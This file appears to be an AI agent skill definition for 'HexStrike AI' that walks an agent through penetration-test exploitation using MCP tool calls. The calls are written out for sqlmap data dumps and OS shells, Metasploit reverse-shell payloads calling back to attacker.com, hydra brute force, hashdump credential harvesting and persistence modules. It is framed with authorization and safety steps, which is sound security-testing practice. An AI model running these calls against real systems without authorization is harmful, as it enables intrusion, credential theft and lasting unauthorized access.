---
name: hexstrike-exploitation-skill
description: Execute safe penetration testing exploits and post-exploitation activities using HexStrike AI tools. Use when user asks to "exploit vulnerability", "gain access", "test exploit", "run exploit", or "attempt exploitation".
metadata:
  author: HexStrike AI
  version: "1.0.0"
  mcp-server: hexstrike-ai-mcp
  category: exploitation
---

# HexStrike AI Exploitation Skill

## Purpose

Execute controlled exploitation attempts to validate vulnerability findings and demonstrate security impact. Emphasizes safe testing methodologies with comprehensive logging and rollback capabilities. Integrates with Metasploit, custom exploits, and post-exploitation frameworks.

## Prerequisites

- Validated vulnerability from assessment phase
- Written authorization for exploitation
- HexStrike AI MCP server connection
- Safe testing environment or explicit authorization
- Rollback plan for production systems

## Safety First Principles

### Before Any Exploitation

1. **Verify Authorization**: Confirm written permission for exploitation
2. **Assess Impact**: Understand potential system impact
3. **Create Backups**: Ensure system can be restored if needed
4. **Set Time Limits**: Define clear testing windows
5. **Establish Communication**: Define incident response contacts

### Safe Exploitation Guidelines

- Start with least invasive techniques
- Use proof-of-concept exploits before full exploitation
- Document all actions taken
- Maintain detailed logs
- Stop immediately if unexpected behavior occurs

## Core Workflow

### Phase 1: Exploit Research and Selection

**Search for Available Exploits**

```bash
# Search exploit databases
searchsploit_query(query="apache 2.4.54", json_output=true)

# Search Metasploit modules
msf_search_module(keyword="apache", type="exploit")

# Check for published PoCs
searchsploit_query(query="CVE-2023-1234", exact_match=true)
```

**Analyze Exploit Suitability**

```python
# Exploit Selection Criteria:
# 1. Reliability rating
# 2. Target compatibility
# 3. Clean-up capability
# 4. Safety level (local vs remote, authenticated vs unauthenticated)
```

### Phase 2: Pre-Exploitation Validation

**Target Validation**

```bash
# Verify target is still vulnerable
nuclei_scan(target="target.com", templates="cves/CVE-2023-1234.yaml")

# Confirm service version
nmap_scan(target="target.com", scan_type="-sV -p 80")

# Test connectivity and responsiveness
httpx_probe(target="target.com", status_code=true, response_time=true)
```

**Environment Preparation**

```bash
# Set up logging
# Configure exploit parameters for safe testing
# Prepare rollback procedures
# Set up monitoring
```

### Phase 3: Controlled Exploitation

**Web Application Exploitation**

```bash
# SQL Injection exploitation
sqlmap_scan(url="http://target.com/page.php?id=1", dump=true, level=5, risk=3)

# Command injection testing
sqlmap_scan(url="http://target.com/exec?cmd=ls", os_shell=true)

# File inclusion vulnerabilities
# Manual testing with controlled payloads
```

**Network Service Exploitation**

```bash
# Metasploit exploitation
msf_exploit_module(
  module="exploit/multi/http/apache_mod_cgi_bash_env_exec",
  target="target.com",
  payload="cmd/unix/reverse_bash",
  options={"RHOSTS": "target.com", "RPORT": 80}
)
```

**Authentication Bypass**

```bash
# Test for default credentials
hydra_brute_force(
  target="target.com",
  service="ssh",
  username_list="/usr/share/wordlists/usernames.txt",
  password_list="/usr/share/wordlists/passwords.txt"
)
```

### Phase 4: Post-Exploitation Activities

**Privilege Escalation**

```bash
# Linux privilege escalation
linpeas_scan(target="192.168.1.100", output_file="/tmp/linpeas-results.txt")

# Windows privilege escalation
winpeas_scan(target="192.168.1.100", output_file="/tmp/winpeas-results.txt")

# Automated privilege escalation
msf_post_module(module="post/multi/recon/local_exploit_suggester")
```

**Information Gathering**

```bash
# System enumeration
msf_post_module(module="post/linux/gather/enum_system")

# Credential harvesting
msf_post_module(module="post/multi/gather/hashdump")

# Network reconnaissance from compromised host
msf_post_module(module="post/multi/gather/ping_sweep")
```

**Persistence (Authorized Testing Only)**

```bash
# Create persistence mechanisms for authorized testing
msf_post_module(module="post/linux/manage/sshkey_persistence")

# Schedule tasks for re-access
msf_post_module(module="post/windows/manage/persistence_exe")
```

### Phase 5: Cleanup and Reporting

**Safe Cleanup**

```bash
# Remove persistence mechanisms
# Delete created files
# Clear logs (if authorized)
# Restore modified configurations
# Document all changes made
```

**Evidence Collection**

```bash
# Screenshot proof of access
# Collect relevant logs
# Document exploitation path
# Record system changes
```

## Exploit Categories

### Low-Risk Exploits (Recommended First)

- Information disclosure
- Error-based SQL injection
- Reflected XSS
- Directory traversal (read-only)
- Unauthenticated information leaks

### Medium-Risk Exploits (With Caution)

- Time-based blind SQL injection
- Stored XSS
- Authentication bypass
- Privilege escalation
- File upload vulnerabilities

### High-Risk Exploits (Authorized Only)

- Remote code execution
- Command injection
- Deserialization attacks
- Memory corruption exploits
- Active Directory attacks

## Tool Integration

### Metasploit Framework

```bash
# Initialize Metasploit
msf_init()

# Search for modules
msf_search_module(keyword="apache", type="exploit")

# Configure and run exploit
msf_exploit_module(
  module="exploit/linux/http/apache_optionsbleed",
  target="target.com",
  payload="linux/x64/meterpreter/reverse_tcp",
  options={
    "RHOSTS": "target.com",
    "RPORT": 80,
    "LHOST": "attacker.com",
    "LPORT": 4444
  }
)

# Run post-exploitation
msf_post_module(module="post/linux/gather/enum_system")
```

### SQLMap Integration

```bash
# Basic exploitation
sqlmap_scan(url="http://target.com/page.php?id=1", dump=true)

# Advanced exploitation
sqlmap_scan(
  url="http://target.com/search?q=test",
  level=5,
  risk=3,
  tamper="base64encode",
  threads=10,
  dump_all=true
)
```

### Custom Exploits

```bash
# Run custom exploit scripts
# Ensure scripts have safety checks
# Implement timeout mechanisms
# Log all activities
```

## Exploit Safety Matrix

| Exploit Type | Safety Level | Rollback Complexity | Monitoring Required |
|-------------|--------------|-------------------|-------------------|
| Information Disclosure | Very Safe | Very Low | Minimal |
| SQL Injection (Read) | Safe | Low | Standard |
| XSS | Safe | Low | Standard |
| File Inclusion | Moderate | Medium | Enhanced |
| Command Injection | Risky | High | Intensive |
| RCE | High Risk | Very High | Maximum |

## Output Format

### Exploitation Report

```json
{
  "exploitation_metadata": {
    "target": "target.com",
    "exploitation_date": "2024-01-15T14:30:00Z",
    "authorized_by": "Security Team",
    "test_window": "2024-01-15 14:00-16:00 UTC",
    "operator": "hexstrike-ai"
  },
  "exploits_attempted": [
    {
      "vulnerability": "CVE-2023-1234",
      "exploit_name": "Apache HTTP Server Buffer Overflow",
      "success": true,
      "access_level": "system",
      "technique": "Remote Code Execution",
      "payload": "linux/x64/shell/reverse_tcp",
      "timestamp": "2024-01-15T14:35:00Z",
      "safety_measures": [
        "Limited to non-production hours",
        "Rollback plan prepared",
        "Real-time monitoring active"
      ]
    }
  ],
  "post_exploitation": {
    "privilege_escalation": {
      "attempted": true,
      "successful": true,
      "method": "Sudo privilege abuse",
      "from": "www-data",
      "to": "root"
    },
    "persistence_created": false,
    "data_accessed": ["system configuration", "user list"],
    "lateral_movement": false
  },
  "cleanup_performed": {
    "persistence_removed": true,
    "files_deleted": ["/tmp/exploit.sh"],
    "logs_cleared": false,
    "system_restored": true
  },
  "impact_assessment": {
    "confidentiality": "High - Access to sensitive data confirmed",
    "integrity": "High - System modification possible",
    "availability": "Low - Service remained operational",
    "overall_risk": "Critical"
  }
}
```

## Constraints and Limitations

### Ethical Constraints

- **Authorization Required**: Never exploit without explicit written permission
- **Scope Boundaries**: Stay within defined testing scope
- **Data Protection**: Handle compromised data responsibly
- **Responsible Disclosure**: Report findings through proper channels

### Technical Constraints

- **Environment Stability**: Exploitation may cause system instability
- **Detection Evasion**: Security controls may block exploitation attempts
- **Tool Limitations**: Not all vulnerabilities have reliable exploits
- **Cleanup Complexity**: Some exploits are difficult to fully reverse

### Safety Constraints

- **Service Impact**: Exploitation may affect service availability
- **Cascade Effects**: Successful exploitation may impact other systems
- **Forensic Impact**: Exploitation leaves traces that affect investigations

## Best Practices

### Before Exploitation

1. Verify all prerequisites are met
2. Document current system state
3. Prepare incident response contacts
4. Set up monitoring and alerting
5. Have rollback procedures ready

### During Exploitation

1. Start with least invasive methods
2. Monitor target system health
3. Document each action taken
4. Maintain detailed timestamps
5. Be prepared to abort immediately

### After Exploitation

1. Perform thorough cleanup
2. Verify system restoration
3. Document exploitation path
4. Generate detailed report
5. Conduct lessons learned session

## Integration with Other Skills

### With reconnaissance-skill

- Use reconnaissance data for exploit targeting
- Validate discovered services before exploitation
- Leverage network topology for lateral movement planning

### With vulnerability-assessment-skill

- Exploit confirmed vulnerabilities from assessment
- Validate severity ratings through actual exploitation
- Provide proof-of-concept for reported issues

### With reporting-skill

- Provide detailed exploitation evidence
- Include impact assessment data
- Support risk scoring with exploitation results

## Troubleshooting

### Common Issues

**Exploit Failures**

- Verify target version matches exploit requirements
- Check for network connectivity issues
- Review firewall and IPS blocking
- Validate exploit parameters

**System Instability**

- Immediately abort exploitation
- Initiate rollback procedures
- Document system state
- Notify incident response team

**Cleanup Challenges**

- Some exploits cannot be fully reversed
- Persistence mechanisms may be difficult to remove
- Log entries may remain
- Configuration changes may persist

### Emergency Procedures

**If System Becomes Unstable**

1. Immediately stop all exploitation activities
2. Attempt graceful service restart
3. Initiate rollback procedures
4. Contact system owners
5. Document incident details

**If Unauthorized Access Detected**

1. Cease all activities immediately
2. Preserve evidence
3. Notify security team
4. Follow incident response procedures
